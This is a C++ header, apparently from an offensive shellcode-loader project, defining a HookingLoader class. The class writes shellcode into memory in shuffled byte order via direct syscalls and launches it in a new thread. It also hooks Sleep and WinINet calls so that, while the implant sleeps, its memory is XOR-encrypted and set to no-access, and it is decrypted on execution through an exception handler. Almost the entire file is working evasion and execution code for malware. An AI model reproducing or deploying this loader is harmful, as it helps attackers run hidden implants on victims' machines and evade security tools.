#pragma once

#include <Windows.h>
#include "Loader.hpp"
#include "detours.h"
#include <iomanip>
#include <algorithm>
#include <ctime>    
#include <cstdlib>  
#include "isyscalls.h"

#include <wininet.h>

#pragma comment(lib, "Wininet.lib")

#pragma comment(lib, "detours_x64.lib")

//#ifdef _DEBUG
#define DOUT(x) do { std::cout <<x; } while(0)
//#else 
//#define DOUT(x) do { ; } while(0)
//#endif



struct MEMHDR {
	LPVOID addr;
	SIZE_T size;
	DWORD oldprot;
	UCHAR key[10];
	bool encrypted;
};

typedef void (WINAPI* SLEEP)(DWORD);
typedef LPVOID(WINAPI* VIRTUALALLOC)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);






// Trampoline function pointers for original API functions
static SLEEP fnSleep;	// Pointer for calling original Sleep function.
static VIRTUALALLOC fnVirtualAlloc;	// Pointer for calling original VirtualAlloc function.

// Global Variables
static HANDLE hEvent;
static HANDLE hOwnProc;
static std::vector<MEMHDR*> memlist;	// list of memory allocations done by the shellcode

int myrandom(int i) { return std::rand() % i; }



////////////////////////////////////////////////////////////////////////////////////////////////////


static BOOL(WINAPI* OldInternetReadFile)(
	_In_ HINTERNET hFile,
	_Out_writes_bytes_(dwNumberOfBytesToRead) __out_data_source(NETWORK) LPVOID lpBuffer,
	_In_ DWORD dwNumberOfBytesToRead,
	_Out_ LPDWORD lpdwNumberOfBytesRead) = ::InternetReadFile;


BOOL WINAPI NewInternetReadFile(
	_In_ HINTERNET hFile,
	_Out_writes_bytes_(dwNumberOfBytesToRead) __out_data_source(NETWORK) LPVOID lpBuffer,
	_In_ DWORD dwNumberOfBytesToRead,
	_Out_ LPDWORD lpdwNumberOfBytesRead
)
{
	SetEvent(hEvent);
	BOOL status = OldInternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
	return status;
}

static BOOL(WINAPI* OldHttpSendRequestA)(HINTERNET hRequest,
	LPCSTR    lpszHeaders,
	DWORD     dwHeadersLength,
	LPVOID    lpOptional,
	DWORD     dwOptionalLength) = ::HttpSendRequestA;


BOOL WINAPI NewHttpSendRequestA(
	HINTERNET hRequest,
	LPCSTR    lpszHeaders,
	DWORD     dwHeadersLength,
	LPVOID    lpOptional,
	DWORD     dwOptionalLength
)
{
	SetEvent(hEvent);
	BOOL status = OldHttpSendRequestA(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
	return status;
}



/////////////////////////////////////////////////////////////////////////////////////////////




class HookingLoader : public Loader
{
protected:

	// Class local variables
	PVOID lpShellcodeBase;

	// Class Global variables


public:
	HookingLoader(std::vector<unsigned char> shellcode) :Loader(shellcode) {

		DWORD ret = 0;
		lpShellcodeBase = NULL;
		fnSleep = Sleep;
		fnVirtualAlloc = VirtualAlloc;
		hOwnProc = GetCurrentProcess();
		hEvent = CreateEvent(NULL, TRUE, false, NULL);

		std::srand(unsigned(std::time(0)));

		//-- Hook various required functions -------------------------------------------------
		/*
		DOUT("[+] Initialising Hooks....");
		DetourRestoreAfterWith();

		if (NO_ERROR == DetourTransactionBegin())  // Initialise he hooking library
			DOUT("SUCCESS\n");
		else
			DOUT("FAILED\n");

		DetourUpdateThread(GetCurrentThread());

		if (NO_ERROR == (ret = DetourAttach(&(PVOID&)fnSleep, MySleep)))	// Install detour function for the original Sleep function
			DOUT("[+] Sleep API Hooked\n");
		else
			DOUT("[+] CANNOT enable Sleep API Hook: err = " << ret << "\n");

		if (NO_ERROR == (ret = DetourAttach(&(PVOID&)fnVirtualAlloc, MyVirtualAlloc)))	// Install detour function for the original VirtualAlloc function
			DOUT("[+] VirtualAlloc API Hooked\n");
		else
			DOUT("[+] CANNOT enable VirtualAlloc API Hook: err = " << ret << "\n");



		//-------------------------------------------------------------------------------------
		if (NO_ERROR == (ret = DetourTransactionCommit()))
			DOUT("[+] Hooks committed\n");
		else
			DOUT("[-] Failed committing hooks\n");

	    */

		AddVectoredExceptionHandler(1, &VEHHandler);

		DetourRestoreAfterWith(); //Avoid duplication HOOK
		DetourTransactionBegin(); // begin HOOK
		DetourUpdateThread(GetCurrentThread());
		DetourAttach((PVOID*)&fnSleep, MySleep);

		DetourAttach((PVOID*)&OldInternetReadFile, NewInternetReadFile);
		DetourAttach((PVOID*)&OldHttpSendRequestA, NewHttpSendRequestA);
		DetourTransactionCommit(); //  submit HOOK

	
		//CreateThread(NULL, 0, ThreadBlockShellcodeMemory, NULL, 0, NULL);
	}


	/*
	~HookingLoader() {
		
	//	DetourTransactionBegin();
	//	DetourUpdateThread(GetCurrentThread());
	//	DetourDetach(&(PVOID&)fnVirtualAlloc, MyVirtualAlloc);
	//	DetourDetach(&(PVOID&)fnSleep, MySleep);
	//	DetourTransactionCommit();
		

		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourDetach((PVOID*)&fnSleep, MySleep);

		DetourDetach((PVOID*)&OldInternetReadFile, NewInternetReadFile);
		DetourDetach((PVOID*)&OldHttpSendRequestA, NewHttpSendRequestA);
		DetourTransactionCommit();
	}
*/


	void load_shellcode() {
		SIZE_T shellcode_len = shellcode.size();
		SIZE_T dwBytesCopied;
		ULONG dwOldProtect = PAGE_READWRITE;
		HANDLE hScThread;
		MEMHDR* first_mem = new MEMHDR;
		std::vector <int>sc_byte_index_list(shellcode_len);
		DOUT("[!] Making Index vector for randomisation (size = " << shellcode_len << ")\n");

		for (int i = 0; i < shellcode_len; i++)
			sc_byte_index_list[i] = i; // Make the index list array

		DOUT("[!] Size of index array = " << sc_byte_index_list.size() << std::endl);

		// Shuffle the list using default randomisation algorithm
		//std::_Random_shuffle1(sc_byte_index_list.begin(), sc_byte_index_list.end(), myrandom);
		std::random_shuffle(sc_byte_index_list.begin(), sc_byte_index_list.end(), myrandom);

		NtAllocateVirtualMemory(hOwnProc, &lpShellcodeBase, 0, &shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		for (int idx : sc_byte_index_list) {
			//int idx = sc_byte_index_list.at(j);
			UCHAR scbyte = shellcode.at(idx);
			NtWriteVirtualMemory(hOwnProc, ((char*)lpShellcodeBase + idx), &scbyte, 1, &dwBytesCopied);
		}

		NtProtectVirtualMemory(hOwnProc, &lpShellcodeBase, &shellcode_len, PAGE_EXECUTE_READWRITE, &dwOldProtect);

		first_mem->oldprot = PAGE_NOACCESS;
		first_mem->size = shellcode_len;
		first_mem->addr = lpShellcodeBase;
		DOUT("[+] Memory allocated for Shellcode at : " << std::hex << lpShellcodeBase << std::endl);
		DOUT("[+] Shellcode memory size			    : " << std::hex << shellcode_len << std::endl);
		memlist.push_back(first_mem);

		NtCreateThreadEx(&hScThread, THREAD_ALL_ACCESS, 0, hOwnProc, lpShellcodeBase, 0, 0, 0, 0, 0, 0);
		DOUT("[+] Starting Shellcode at " << std::hex << lpShellcodeBase << std::endl);
		WaitForSingleObject(hScThread, INFINITE);

		//(*(void (*)())lpShellcodeBase)();
	}





	// Detour function which overrides Sleep.
private:
	static LPVOID WINAPI MyVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect) {
		DOUT("[!] MY_VIRTUAL_ALLOC : Size = " << dwSize << std::endl);
		LPVOID alloc_addr = fnVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
		if (alloc_addr != NULL) {
			MEMHDR* hMem = new MEMHDR;
			srand(time(0));
			hMem->size = dwSize;
			hMem->addr = alloc_addr;
			hMem->oldprot = flProtect;
			hMem->encrypted = false;
			for (int i = 0; i < 10; i++) {
				hMem->key[i] = rand() % 0xff;
			}

			memlist.push_back(hMem);
			DOUT("[+] Allocation size : " << hMem->size << "(" << std::dec << hMem->size << ")" << std::endl);
			DOUT("[+] Assigned address : 0x" << std::noshowbase << std::setw(16) << std::setfill('0') << std::hex << hMem->addr << std::endl);
		}
		return alloc_addr;

		/*LPVOID ptr = fnVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
		DOUT("[!] Virtual memory allocation address = " << std::hex << ptr << std::endl);
		return ptr;*/
	}

	static void WINAPI MySleep(DWORD dwMilliseconds) {
		DOUT("[!] MY_SLEEP : Sleep time = " << dwMilliseconds << std::endl);
		// SetEvent(hEvent);

		for (MEMHDR* hMem : memlist) {

			DOUT("[!] Generating a random key block for mem at " << std::hex << hMem->addr << std::endl);
			// Generate a Random XOR key for the memory block

			DOUT("[!] Encrypting mem at " << std::hex << hMem->addr << " of size = " << std::dec << hMem->size << " bytes" << std::endl);
			
			for (int i = 0; i < hMem->size ; i++) {
				((char*)hMem->addr)[i] ^= hMem->key[i % 10];
			}

			hMem->encrypted = true;
			
			DOUT("[!] Marking NOACCESS for mem at " << std::hex << hMem->addr << std::endl);
			VirtualProtect(hMem->addr, hMem->size, PAGE_NOACCESS, &(hMem->oldprot));
		}

		fnSleep(dwMilliseconds);
		DOUT("[!] Out of SLEEP \n");
	}

	static int GetExceptionBaseAddr(DWORD64 addr) {
		int i = 0;
		
		for (MEMHDR* hMem : memlist) {
			if ((addr < (DWORD64)((char*)hMem->addr + hMem->size)) && addr >= (DWORD64)hMem->addr) {
				DOUT("[!] Memory exception at 0x" << std::noshowbase << std::setw(16) << std::setfill('0') << std::hex << addr << std::endl);
				return i;
			}
			i++;
		}
		DOUT("[-] Memory exception at address not being monitored: " << std::hex << addr << std::endl);
		//return -1;
	}

	static LONG NTAPI VEHHandler(PEXCEPTION_POINTERS pExcepInfo)
	{
		DOUT("[!] Exception error code : " << std::hex << pExcepInfo->ExceptionRecord->ExceptionCode << std::endl);
		DOUT("[!] Thread Instruction Pointer : " << std::hex << pExcepInfo->ContextRecord->Rip << std::endl);

		if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xc0000005)
		{
			int idx = GetExceptionBaseAddr(pExcepInfo->ContextRecord->Rip);
			if (idx != -1) {
				DOUT("[!] Shellcode wants to Run. Restoring to RWX and Decrypting\n");
				for (MEMHDR* hMem : memlist) {
					DOUT("[*]\t\t\t* " << std::hex << hMem->addr << " of size = " << std::dec << hMem->size << " bytes" << std::endl);

					HANDLE hAddr = hMem->addr;
					SIZE_T szMemSize = hMem->size;
					DWORD oldprot = hMem->oldprot;

					NtProtectVirtualMemory(hOwnProc, &hAddr, &szMemSize, PAGE_EXECUTE_READWRITE, &oldprot);
					if (hMem->encrypted) {
						for (int i = 0; i < hMem->size; i++) {
							((char*)hMem->addr)[i] ^= hMem->key[i % 10];
						}

						hMem->encrypted = false;
					}
				}
				return EXCEPTION_CONTINUE_EXECUTION;
			}
		}
		return EXCEPTION_CONTINUE_SEARCH;
	}

	//static DWORD WINAPI ThreadBlockShellcodeMemory(LPVOID lpParameter)
	//{
	//	while (true)
	//	{
	//		WaitForSingleObject(hEvent, INFINITE);
	//		DOUT("[!] Setting shellcode memory to NOACCESS\n");
	//		for (MEMHDR* hMem : memlist) {
	//			VirtualProtect(hMem->addr, hMem->size, PAGE_NOACCESS, &(hMem->oldprot));
	//		}
	//		ResetEvent(hEvent);
	//	}
	//	return 0;
	//}
};

